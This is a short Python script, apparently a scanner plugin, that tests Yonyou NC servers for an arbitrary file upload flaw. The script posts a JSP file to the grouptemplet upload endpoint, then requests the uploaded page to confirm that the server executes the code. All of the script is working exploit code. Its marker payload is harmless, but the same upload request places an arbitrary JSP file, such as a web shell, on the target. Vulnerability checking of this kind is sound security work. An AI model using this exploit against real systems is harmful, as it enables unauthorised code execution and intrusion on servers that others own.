import requests
import urllib

from inc.generate_random import generate_random_str
def verify(url):
    relsult = {
        'name': '用友NC_grouptemplet文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ',
        'User-Agent': 'Mozilla/5.0'
    }
    char = generate_random_str(15)
    data = f'''------WebKitFormBoundaryEXmnamw5gVZG9KAQ
    Content-Disposition: form-data; name="file"; filename="test.jsp"
    Content-Type: application/octet-stream

    <%out.println("{char}");%>
    ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--'''
    vurl = urllib.parse.urljoin(url, "/uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            vurl = url + '/uapim/static/pages/nc/head.jsp'
            response = requests.get(vurl)
            if response.status_code == 200 and char in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult